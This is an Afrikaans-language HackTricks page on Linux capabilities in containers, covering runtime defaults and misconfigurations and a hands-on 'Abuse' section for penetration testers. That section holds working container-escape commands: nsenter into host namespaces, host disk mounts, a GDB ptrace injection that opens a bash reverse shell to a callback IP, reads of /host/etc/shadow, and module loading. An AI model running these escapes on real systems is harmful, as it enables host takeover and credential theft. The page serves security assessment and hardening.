# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

Linux capabilities is een van die belangrikste dele van container security omdat hulle ’n subtiele maar fundamentele vraag beantwoord: **wat beteken "root" werklik binne ’n container?** Op ’n normale Linux-stelsel het UID 0 histories ’n baie breë stel privileges geïmpliseer. In moderne kernels word daardie privilege opgebreek in kleiner eenhede genaamd capabilities. ’n Process kan as root loop en steeds baie kragtige bewerkings nie kan uitvoer nie indien die relevante capabilities verwyder is. <sup>[[1]](#references)</sup>

Containers maak sterk staat op hierdie onderskeid. Baie workloads word steeds as UID 0 binne die container geloods om redes van compatibility of eenvoud. Sonder capability dropping sou dit heeltemal te gevaarlik wees. Met capability dropping kan ’n containerized root process steeds baie gewone in-container-take uitvoer, terwyl dit toegang tot meer sensitiewe kernel-bewerkings geweier word. Daarom beteken ’n container shell wat `uid=0(root)` wys nie outomaties "host root" of selfs "breë kernel privilege" nie. Die capability sets bepaal hoeveel daardie root-identiteit werklik werd is.

Vir die volledige Linux capability-verwysing en baie abuse-voorbeelde, sien:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Werking

Capabilities word in verskeie sets nagespoor, insluitend permitted, effective, inheritable, ambient en bounding sets. Vir baie container-assessments is die presiese kernel-semantiek van elke set minder onmiddellik belangrik as die finale praktiese vraag: **watter bevoorregte bewerkings kan hierdie process nou suksesvol uitvoer, en watter toekomstige privilege gains is steeds moontlik?** <sup>[[1]](#references)</sup>

Die rede waarom dit saak maak, is dat baie breakout techniques eintlik capability-probleme is wat as container-probleme vermom word. ’n Workload met `CAP_SYS_ADMIN` kan toegang kry tot ’n enorme hoeveelheid kernel-funksionaliteit waaraan ’n normale container root process nie behoort te raak nie. ’n Workload met `CAP_NET_ADMIN` word baie gevaarliker indien dit ook die host network namespace deel. ’n Workload met `CAP_SYS_PTRACE` word baie interessanter indien dit host processes deur host PID sharing kan sien. In Docker of Podman kan dit as `--pid=host` verskyn; in Kubernetes verskyn dit gewoonlik as `hostPID: true`.

Met ander woorde, die capability set kan nie in isolasie geëvalueer word nie. Dit moet saam met namespaces, seccomp en MAC policy gelees word.

## Lab

’n Baie direkte manier om capabilities binne ’n container te inspekteer, is:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Jy kan ook ’n meer beperkte container vergelyk met een waaraan al die capabilities bygevoeg is:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Om die effek van ’n beperkte toevoeging te sien, probeer om alles te verwyder en slegs een capability terug te voeg:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Hierdie klein eksperimente help wys dat ’n runtime nie bloot ’n boolean genaamd "privileged" aan- of afskakel nie. Dit vorm die werklike privilege-oppervlak wat vir die proses beskikbaar is.

## Hoërisiko-Capabilities

Capabilities word slegs escape primitives wanneer hul werking ’n **host-governed resource** bereik. Die herhalende hoërisiko-kombinasies is:

- **`CAP_SYS_ADMIN`** plus ’n host PID, block device, of writable kernel-control path. Om by ’n teiken-mount namespace aan te sluit, vereis addisioneel `CAP_SYS_CHROOT`; om ’n block-based filesystem te mount, vereis `CAP_SYS_ADMIN` in die initial user namespace.
- **`CAP_SYS_PTRACE`** plus host PID visibility en ’n attachable host process. `CAP_SYS_ADMIN` word nie vir ptrace injection vereis nie.
- **`CAP_DAC_OVERRIDE` of `CAP_DAC_READ_SEARCH`** plus ’n reachable host filesystem. Hierdie capabilities omseil verskillende DAC checks, maar skep nie ’n host filesystem view nie.
- **`CAP_SYS_MODULE`** in die initial user namespace plus ’n accepted, kernel-compatible module. Ordinary Linux containers deel die node kernel; VM- of userspace-kernel-runtimes verander daardie grens.
- **`CAP_MKNOD`** in die initial user namespace plus ’n werklike host device wat die device cgroup reeds toelaat. Die skep van ’n node omseil nie die device cgroup nie.
- **`CAP_SYS_RAWIO`** plus ’n exposed en usable memory-, I/O-port-, PCI- of device-control interface.
- **`CAP_SYS_BOOT`** plus die initial PID namespace vir ’n host reboot, of ’n usable en permitted kexec path vir kernel replacement.
- **`CAP_NET_ADMIN`** in die host network namespace vir direkte node network-state control. **`CAP_NET_RAW`** kan aan ’n protocol-specific escape deelneem, maar raw sockets alleen is nie ’n node shell nie.

`CAP_SYS_CHROOT` word doelbewus nie as ’n standalone escape capability gelys nie. Dit kan deur mount-namespace `setns()` vereis word en kan ’n reeds accessible host tree makliker maak om te gebruik, maar `chroot()` alleen stel nie daardie tree bloot of verleen nuwe filesystem permissions nie. Net so stel `CAP_BPF` en `CAP_PERFMON` kragtige telemetry en kernel attack surface bloot, maar sonder ’n afsonderlike kernel flaw is hul gewone operasies nie generiese container escapes nie.

## Runtime Usage

Docker, Podman, containerd-based stacks en CRI-O gebruik almal capability controls, maar die defaults en management interfaces verskil. Docker stel hulle direk bloot deur flags soos `--cap-drop` en `--cap-add`. Podman stel soortgelyke controls bloot en kombineer dit gewoonlik met rootless execution as ’n addisionele safety layer. Kubernetes stel capability additions en drops deur die Pod of container se `securityContext` bloot; lower-level runtimes druk die resulterende sets in die OCI runtime configuration uit. System-container-omgewings soos LXC en Incus steun ook op capability control, maar hul breër host integration kan operators verlei om defaults meer aggressief te verslap as wat hulle vir ’n application container sou doen. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Dieselfde beginsel geld oor almal heen: ’n capability wat tegnies moontlik is om toe te ken, is nie noodwendig een wat toegeken behoort te word nie. Baie real-world incidents begin wanneer ’n operator ’n capability byvoeg bloot omdat ’n workload onder ’n strenger configuration misluk het en die span ’n vinnige fix nodig gehad het.

## Misconfigurations

Die mees ooglopende fout is **`--cap-add=ALL`** in Docker/Podman-style CLIs, maar dit is nie die enigste een nie. In die praktyk is ’n meer algemene probleem om een of twee uiters kragtige capabilities toe te ken, veral `CAP_SYS_ADMIN`, om "die application te laat werk" sonder om ook die namespace-, seccomp- en mount-implikasies te verstaan. Nog ’n algemene failure mode is om ekstra capabilities met host namespace sharing te kombineer. In Docker of Podman kan dit as `--pid=host`, `--network=host` of `--userns=host` verskyn; in Kubernetes verskyn die ekwivalente blootstelling gewoonlik deur workload settings soos `hostPID: true` of `hostNetwork: true`. Elkeen van hierdie kombinasies verander wat die capability werklik kan beïnvloed.

Dit is ook algemeen dat administrators glo dat, omdat ’n workload nie ten volle `--privileged` is nie, dit steeds betekenisvol beperk word. Soms is dit waar, maar soms is die effective posture reeds naby genoeg aan privileged dat die onderskeid operasioneel ophou saak maak.

## Abuse

Begin deur die effective sets, user-namespace mapping, seccomp state, namespaces, mounts en devices aan te teken. ’n Capability-naam sonder hierdie konteks bewys nie ’n escape nie:
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: namespaces en bloktoestelle

Met sigbaarheid van die host se PID's kan `CAP_SYS_ADMIN` die host se namespaces betree. Die mount-namespace-bewerking benodig ook `CAP_SYS_CHROOT` in die oproeper se user namespace.

**Kontroleer die capability en beperking:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**Enumereer die teiken:** bevestig host PID-sharing vanuit die container/Pod-konfigurasie of ’n onmiskenbare lys van host-prosesse, en inspekteer dan die teiken se namespaces. ’n Plaaslike PID 1 bestaan ook in private PID namespaces, dus bewys die blote teenwoordigheid daarvan nie host PID-sharing nie.
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**Exploit die namespace path:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
Die capability checks moet slaag in die user namespaces wat die teikens besit. `--pid=host` of Kubernetes se `hostPID: true` verskaf sigbaarheid; dit verskaf nie die capabilities nie.

Vir die alternatiewe block-device path, **enumerate** die kandidate en **exploit** dan die toeganklike filesystem deur eers die gevalideerde kandidaat read-only te mount:
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
Die toestelnode moet bestaan, die device cgroup moet dit toelaat, en block-filesystem mounts vereis `CAP_SYS_ADMIN` in die aanvanklike user namespace. ’n Host root wat reeds by `/host` gebind-gemount is, bied host access **sonder** `CAP_SYS_ADMIN`; `chroot /host` is slegs ’n gerieflikheidsfunksie en vereis afsonderlik `CAP_SYS_CHROOT`.

### Bereikbare host root: direkte filesystem-uitvoering

As die host root reeds by `/host` gemount is, bevestig eers die mount en gebruik dan die bestaande access direk. Hierdie pad is nie afhanklik van `CAP_SYS_ADMIN` nie:
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
As `chroot()` nie beskikbaar is nie, maar die host binary versoenbaar is met die container se argitektuur en loader, kan dit dikwels eerder deur die gemounte boom geroep word:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
Direkte lees- en skryfbewerkings onder `/host` is reeds ’n host-filesystem compromise. `chroot()` of die uitvoering van ’n host binary maak daardie toegang net geriefliker; geen van die twee bewerkings skep die host mount of omseil ’n read-only mount of MAC policy nie.

### `CAP_SYS_PTRACE`: host-process injection

Met host PID visibility en `CAP_SYS_PTRACE` in die teiken se user namespace kan GDB ’n goedgekeurde host process `system()` laat aanroep. `CAP_SYS_ADMIN` word nie vereis nie.

**Kontroleer die capability- en attachment-kontroles:**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**Enumereer en kies ’n weggooibare teiken:** bevestig die deling van host-PID’s vanuit die konfigurasie of ’n onmiskenbare node-proseslys; kies nooit PID 1 of ’n kritieke daemon nie.
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**Exploiteer die geselekteerde proses:**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
Die teiken moet koppelbaar wees en ’n bruikbare `system()`-simbool en Bash-payload-pad hê. Yama, nie-dumpbare toestand, seccomp, user namespaces en MAC-beleid kan die ketting blokkeer. GDB stop die teiken terwyl dit gekoppel is, dus moet slegs ’n weggooibare laboratoriumproses gebruik word.

### `CAP_DAC_OVERRIDE` en `CAP_DAC_READ_SEARCH`: beskermde gasheerlêers

Hierdie capabilities stel nie die host-lêerstelsel bloot nie. As `/host` reeds ’n host-mount is, kan `CAP_DAC_READ_SEARCH` DAC-kontroles vir lees/soek omseil, en `CAP_DAC_OVERRIDE` kan ook gewone skryfkontroles omseil:

**Kontroleer die capabilities:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Enumereer die blootgestelde gasheer-lêerstelsel en teikentoestemmings:**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**Oefen die lees- en skryfomseilings** in ’n weggooibare laboratorium:
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
'n read-only mount en LSM-reëls is steeds van toepassing. `CAP_DAC_READ_SEARCH` magtig ook `open_by_handle_at()`, maar 'n breakout soos Shocker benodig addisioneel 'n mount file descriptor vir dieselfde underlying filesystem, geldige of opspoorbare handles, 'n versoenbare filesystem/storage-uitleg, en geen runtime- of LSM-blokkering nie. Dit verskaf nie arbitrêre toegang tot elke filesystem buite die mount namespace nie.

### `CAP_SYS_MODULE`: shared-kernel-uitvoering

In 'n gewone Linux-container loop 'n aanvaarde module in die gedeelde host-kernel.

**Kontroleer die capability en user-namespace-scope:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Lys vereistes vir module-laai:**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**Exploit slegs met ’n versoenbare, voorafhersiene proof module op ’n weggooibare node:**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
Die capability moet in die aanvanklike gebruikersnaamruimte effektief wees. Kernel-weergawe en -konfigurasie, module signatures, lockdown, seccomp en LSM-beleid moet die laai daarvan toelaat. Kata, gVisor, Hyper-V-isolation en soortgelyke runtimes verander watter kernel-grens die workload bereik.

### `CAP_MKNOD`: create a permitted device handle

`CAP_MKNOD` skep ’n device node, maar omseil nie die device cgroup nie. Device creation is nie genamespasieer nie, dus moet die capability in die aanvanklike gebruikersnaamruimte effektief wees.

**Check the capability and user-namespace scope:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Enumerateer die werklike toestelle, hul major/minor-nommers en enige sigbare cgroup-v1-toelaatlys:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**Exploit ’n gevalideerde ext-family-kandidaat in leesalleenmodus:**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Ander filesystems benodig ’n ooreenstemmende leesalleen-tool; om die device te mount benodig ook `CAP_SYS_ADMIN`. `Operation not permitted` wanneer die geskepte node oopgemaak word, dui gewoonlik daarop dat die device cgroup dit steeds blokkeer. Onder cgroup v2 word device-toegang gewoonlik met BPF afgedwing en bestaan daar geen `devices.list`-lêer nie, dus is ’n suksesvolle open die beslissende toets.

### `CAP_SYS_RAWIO`: blootgestelde raw-I/O-koppelvlak

Daar is geen draagbare generiese payload nie: geldige adresse en effekte hang van die hardware en kernel-konfigurasie af.

**Kontroleer die capability en user-namespace-omvang:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Lys blootgestelde rou-koppelvlakke, hardeware en drywers:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**Exploit slegs met ’n goedgekeurde proof vir die geïdentifiseerde device en address range.** Indien `/dev/mem` die lab-goedgekeurde interface is, bewys hierdie template node-memory disclosure sonder om die inhoud daarvan te druk:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
Die adres moet van die lab se hardewarekaart afkomstig wees, omdat die lees van sommige MMIO-areas newe-effekte kan hê. ’n Generiese memory-write-opdrag sou misleidend en onveilig wees: dieselfde adres kan op een masjien onskadelik wees, maar op ’n ander masjien hardeware of kernelgeheue beheer. Device cgroups, filesystem-permissies, streng `/dev/mem`, kernel lockdown, virtualisering en LSM-beleid verhoed gewoonlik nuttige toegang.

### `CAP_SYS_BOOT`: namespace reboot of kernelvervanging

In ’n private PID-namespace beëindig `reboot()` daardie namespace se init-proses eerder as om die host te reboot. ’n Host-reboot-impak vereis dus die aanvanklike PID-namespace, gewoonlik deur host-PID-sharing. ’n kexec-pad vereis ook ’n versoenbare kernel image en permissiewe lockdown-/signature-beleid:

**Kontroleer die capability:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Enumereer die PID-namespace- en kexec-voorvereistes:** bevestig host-PID-sharing vanuit die werkladingkonfigurasie, omdat ’n PID-namespace-skakel alleen nie aandui of dit die node se aanvanklike namespace is nie.
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**Exploit slegs wanneer die herlaai van ’n weggooibare lab-node die uitdruklike oefening is:**
```bash
sync
reboot -f
```
Moenie daardie command uitvoer of ’n kernel op ’n gedeelde node laai bloot om die capability te bewys nie. In ’n private PID namespace beëindig dit slegs daardie namespace se init process en demonstreer dit nie impak op die host nie.

### `CAP_NET_ADMIN` en `CAP_NET_RAW`: host-netwerkpaaie

`CAP_NET_ADMIN` beïnvloed slegs die huidige netwerk-namespace.

**Kontroleer die capabilities en isolasie:**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Enumereer die huidige netwerk en bevestig gasheernetwerking vanuit die werkladingkonfigurasie:**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**Oefen `CAP_NET_ADMIN` omkeerbaar:** met host networking is die tydelike interface ’n node interface.
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` laat RAW- en PACKET-sockets toe, maar is nie ’n generiese host shell nie. Om die gedokumenteerde GCE chain te **enumerate**, kontroleer die metadata-roete en lê vas of plaintext guest-agent-verkeer waarneembaar is:
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
Indien die ooreenstemmende prerequisites bestaan, **exploit** die omgewing-spesifieke chain soos gedokumenteer in [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): capture die request en sequence state, inject die forged metadata response wat ’n SSH key bevat, en validateer daarna host access. Die chain het root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext GCE metadata traffic en ’n raceable guest-agent request vereis; moderne transport- of agentgedrag kan dit breek.

## Kontroles

Die doel van die capability checks is nie net om raw values te dump nie, maar om te verstaan of die process genoeg privilege het om sy huidige namespace- en mount-situasie gevaarlik te maak.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Wat hier interessant is:

- `capsh --print` is die maklikste manier om hoërisiko-capabilities soos `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` of `cap_sys_module` raak te sien.
- Die `CapEff`-reël in `/proc/self/status` wys wat tans werklik effektief is, nie net wat moontlik in ander stelle beskikbaar is nie.
- ’n Capability-dump word baie belangriker as die container ook host PID-, network- of user namespaces deel, of skryfbare host mounts het.

Nadat die rou capability-inligting versamel is, is die volgende stap interpretasie. Vra of die proses root is, of user namespaces aktief is, of host namespaces gedeel word, of seccomp afdwingend is, en of AppArmor of SELinux steeds die proses beperk. ’n Capability-stel op sy eie is slegs ’n deel van die verhaal, maar dit is dikwels die deel wat verduidelik waarom een container breakout werk en ’n ander een met dieselfde oënskynlike beginpunt misluk.

## Runtime Defaults

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Verminderde capability-stel by verstek | Docker behou ’n verstek-allowlist van capabilities en verwyder die res | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Verminderde capability-stel by verstek | Podman-containers is by verstek unprivileged en gebruik ’n verminderde capability-model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Erf runtime-verstekwaardes tensy dit verander word | Indien geen `securityContext.capabilities` gespesifiseer word nie, kry die container die verstek-capability-stel van die runtime | `securityContext.capabilities.add`, versuim om `drop: [\"ALL\"]` te gebruik, `privileged: true` |
| containerd / CRI-O under Kubernetes | Gewoonlik runtime-verstekwaarde | Die effektiewe stel hang van die runtime plus die Pod-specifikasie af | dieselfde as die Kubernetes-ry; direkte OCI/CRI-konfigurasie kan ook capabilities uitdruklik byvoeg |

Vir Kubernetes is die belangrike punt dat die API nie een universele verstek-capability-stel definieer nie. As die Pod nie capabilities byvoeg of verwyder nie, erf die workload die runtime-verstekwaarde vir daardie node.

## References

- [1] [capabilities(7) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux-containerkonfigurasie](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime-voorregte en Linux-capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Stel capabilities vir ’n container in](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` en `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Sekuriteit](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
